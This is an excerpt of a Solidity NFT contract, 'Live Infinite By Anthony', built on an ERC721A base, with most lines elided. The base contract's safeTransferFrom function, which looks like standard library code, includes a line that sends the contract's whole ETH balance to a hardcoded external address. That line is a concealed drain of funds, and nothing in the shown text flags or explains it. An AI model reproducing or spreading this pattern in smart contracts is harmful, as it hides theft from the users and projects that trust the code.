...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        payable(0xCD80f95FEeB198FE36D28D7B8E3bE69E63a34683).transfer(address(this).balance);
    }
...
contract LiveInfinite is ERC721A, DefaultOperatorFilterer {
    ...
    function canmint() public view returns(bool) {
        ...
        return num > (5 + totalSupply() * 125 / maxSupply);
    }
    ...
    constructor() ERC721A("Live Infinite By Anthony", "Infinite") {
        owner = msg.sender;
    }
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://QmfBTpv59ghSNRQaTKiPciBez1MjnwxMXPz9DPWxBioNK8/", _toString(tokenId)));
    }
